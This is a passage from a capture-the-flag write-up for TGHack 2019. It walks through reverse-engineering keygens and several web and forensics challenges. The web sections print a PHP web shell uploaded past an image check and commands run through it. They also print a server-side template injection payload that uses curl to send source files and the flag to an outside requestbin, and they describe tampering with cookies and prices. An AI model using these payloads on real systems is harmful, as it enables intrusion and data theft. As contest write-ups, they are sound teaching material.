# TGHack 2019

Sadly, I did not get to attend the event, but I'll try to create a writeup of some of the cooler challenges here, as they were so kind as to post the challenges after the competition ended.

## [RE // 50pt] Bytecodes

```bash
pip install uncompyle6
uncompyle6 main.pyc
```

Then simply copy the `print_flag` function into a repl, and run. (I had to change `chr(i ^ key)` to `chr(ord(i) ...`).

## [RE // 250pt] Cracking Magic

`file <file>`

```
key_check.elf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ac6bea7a2d5448a7f91876ffa04540f3f0da551e, stripped
```

`checksec <file>`

```
~/Documents/ctf/tghack2019/key_check   
‚ùØ checksec key_check.elf 
[*] '/home/igor/Documents/ctf/tghack2019/key_check/key_check.elf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we know it's going to be very hard to crack the program, so I guess keygen is the best way to proceed here.

Upon running the program, we're greeted by a prompt for a serial. Naturally, we don't know this, so let's open it in Ghidra and IDAFree.

Firstly, the program reads in 25 chars and replaces the newline with a `0x00` before jumping to a checking function.

Firstly, it checks to see if the user input now is 24 chars long, which is will be as we replaced the newline with a null-byte.

Then we enter `check 1`.

The pseudo-code generated by ghidra looks like this after a bit of modification;

```c
int check_for_whitespace(char *user_input)

{
  ushort **ppuVar1;
  size_t user_input_len;
  ulong i;
  
  i = 0;
  while( true ) {
    user_input_len = strlen(user_input);
    if (user_input_len <= i) {
      return 1;
    }
    ppuVar1 = __ctype_b_loc();
    if (((*ppuVar1)[(long)user_input[i]] & 8) == 0) break;
    i = i + 1;
  }
  return 0;
}
```

After googling the cryptic `__ctype_b_loc()`, we find that it returns a table of characteristics for characters, and we deduce
that this function checks to see if there is any whitespace in the string.

Now we only have the actual key checking left;

```c
      i = 0;
      while (i < 0xc) {
        uVar1 = FUN_0010098a(user_input[i],user_input[i + 1]);
        if ((int)uVar1 == 0) {
          return 0;
        }
        i = i + 2;
      }
      local_18 = 0xc;
      while (local_18 < 0x18) {
        uVar1 = FUN_001009ac(user_input[local_18],user_input[local_18 + 1]);
        if ((int)uVar1 == 0) {
          return 0;
        }
        local_18 = local_18 + 2;
      }
      ret_code = 1;
```

First things first, let's clean this up.

```c
      i = 0;
      while (i < 0xc) {
        fun1_ret = fun1(user_input[i],user_input[i + 1]);
        if ((int)fun1_ret == 0) {
          return 0;
        }
        i = i + 2;
      }
      j = 0xc;
      while (j < 0x18) {
        fun2_ret = fun2(user_input[j],user_input[j + 1]);
        if ((int)fun2_ret == 0) {
          return 0;
        }
        j = j + 2;
      }
      ret_code = 1;
```

We see that we want both of the functions to return `> 0`. Let's start with the first part, which works with the first part of the key `0x00 <= x <= 0xc`.

After cleaning up the parameters, we end up with this snippet;

```c
ulong fun1(char charA,char charB)
{
  return (int)(uint)((char)(charA ^ charB ^ 0x42U) < 'F');
}
```

(_`0x42U == 'B'`_)

Let's write some quick python to brute-force this (also included part two, as it's just the same logic).

```python
result = ''

def find_stage_1():
	for x in range(ord('A'), ord('Z')):
		for y in range(ord('A'), ord('Z')):
			if (x ^ y ^ 0x42) < ord('F'):
				return chr(x) + chr(y)


def find_stage_2():
	for x in range(ord('A'), ord('Z')):
		for y in range(ord('A'), ord('Z')):
			if (x ^ y ^ 0x13) > 0x1e:
				return chr(x) + chr(y)

for i in range(0, 0xc, 2):
	result += find_stage_1()	

for i in range(0xc, 0x18, 2):
	result += find_stage_2()	

print(result)
```

Now, we need 250 unique keys, so let's bruteforce that as well :)

Now, this is not a clean solution, but it works, in true CTF fashion.

```python
ones = []

for x in range(ord('A'), ord('Z')):
	for y in range(ord('A'), ord('Z')):
		if (x ^ y ^ 0x42) < ord('F') and len(ones) < 2:
			ones.append(chr(x) + chr(y))

ones = [x + y for x in ones for y in ones]
ones = [x + y for x in ones for y in ones]
ones = [x + y for x in ones for y in ones]
ones = [x[0:12] for x in ones]

twos = []

for x in range(ord('A'), ord('Z')):
	for y in range(ord('A'), ord('Z')):
		if (x ^ y ^ 0x13) > 0x1e and len(twos) < 2:
			twos.append(chr(x) + chr(y))

twos = [x + y for x in twos for y in twos]
twos = [x + y for x in twos for y in twos]
twos = [x + y for x in twos for y in twos]
twos = [x[0:12] for x in twos]

# print ','.join(ones)
# print ','.join(twos)

combos = []

for a in ones:
	for b in twos:
		combos.append(a + b)

print ', '.join(combos)

print "\n\n\n{}".format(len(combos))
```

Basically, I just create a few letter combos, and then concat them together. This gives 65536 results, which should be sufficient. Now, when I created this, I didn't factor in the fact that this creates a bunch of duplicates, but I managed to hack my way around it in the end.

What I ended up doing was the following:

```python
p = pwn.remote('keygen.tghack.no', 2222)

for i in range(250):
	print p.recv(1024)
	p.sendline(combos[i*250])

p.interactive()
```

There is no logic to this at all, but it works!

Flag acquired!

## [RE // 70pt] Elfish flag

ELF exec again. We open it in Ghidra and realize that it's just a fuzzed flag. Let's unfuzz!

Let's check out the function `flaggy` where the magic happens.

```c
  tg = 18260;
                    /* if str2 is a nullptr */
  if (str2 != (char *)0x0) {
    local_24 = 0;
    while (iVar1 = local_24 + 1, local_24 != 0) {
      uVar2 = (uint)(iVar1 >> 0x1f) >> 0x1f;
      abStack24[(long)iVar1] = tg[(long)(int)((iVar1 + uVar2 & 1) - uVar2)] ^ str2[(long)iVar1];
      local_24 = iVar1;
    }
  }
  i = 0;
  while( true ) {
    if ((uint)(byte)input[(long)i] + 100 != (uint)(byte)str1[(long)i]) break;
    i = i + 1;
  }
  if (i == 0x19) {
    printf("Congratz, you found the flag!");
  }
```
  
**This** is where the magic happens.

But when reading this, something stood out to me. Input is never modified :think:. So, what happens if we take str1, and subtract 100 from every codepoint? Well, we get the flag. This was an easy task after all! :)

## [Web // 150pt] Imagicur

We need to _heck_ a PHP website (nothing new here). We're given the source code, and we quickly spot that the image validation only happens if `$_POST["submit"]` is set. So let's uplaod an _image_ with the cute picture and remove the `name` attr from the submit button

```php
<?php system($_GET[0]) ?>
```

And then go to the website we're rewarded with.

Now let's add the query `...?0=find / -name 'flag.txt'`. After that we find that the flag is at `/var/www/html/flag.txt`, and we can go the website with the query params `...?0=cat /var/www/html/flag.txt`.

Ta-da. :tada:

## [Web // 50pt] Fortune cookie

We get a hint to cookies. Let's check them out. 

We find this one

```
access_token -> divination:student
```

Let's change this to something else, let's say, `professor`. gg

## [Web // 300pt] Wizardschat

Here we're first prompted with a login page, so I open it up in burp to examine the requests. To login, we simply need to edit the `has_magic` hidden param. 

When opening the website, we can see our username, and enter messages to send to the other users.

I fiddled a bit with the messages and username, but they're both sanitized.

So, the only thing that's left then is the cookie we send to the server, which is rendered at the top of the page.

First, I try the common mustache method, and enter `{{ 1 + 1 }}`, and _voilla_, my username is 2. We have SSTI (Server-Side Template Injection).

Now let's try to get something worthwhile to run.

After this I googled (and fiddled with) SSTIs for python, and ended up with the following, as I couldn't find `file` anywhere.

```python
{{"".__class__.mro()[1].__subclasses__()[181](['curl','https://enokry4q44i3.x.pipedream.net','-F','data=@main.py'])}}
```

The weird URL was my requestbin so I could see the output.

By simply changing `main.py` to `flag.txt`, we get the flag! :)

## [Web // 100pt] itsmagic

_Security is almost as bad as it's learning, sheesh_.

We try to login, works no matter what. Always same ID. The hint basically tells you the answer... Simply change the ID from 1338 to 1337 and you have your flag. Wtf?

## [Web // 100pt] Wandshop

Well, this is also a very easy task, so short writeup.

You need to get the most expensive wand, which you can't afford. So, let's open up the network tab in the browser to see what is being sent to the server. Well would you look at that, it passes along the price. Just change it to _whatever_ and submit, and you have your flag.

## [Forensics // 70pt] Filemagic

You get a file with the following type

```
store.bin: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "mkfs.fat", sectors/cluster 4, root entries 512, sectors 2048 (volumes <=32 MB), Media descriptor 0xf8, sectors/FAT 2, sectors/track 32, heads 64, serial number 0x71a6dccf, label: "magic      ", FAT (12 bit)
```

`binwalk store.bin` to reveal that there is a png inside.

OK, `binwalk --dd=png store.bin` to extract it.

You're done.

Open the 
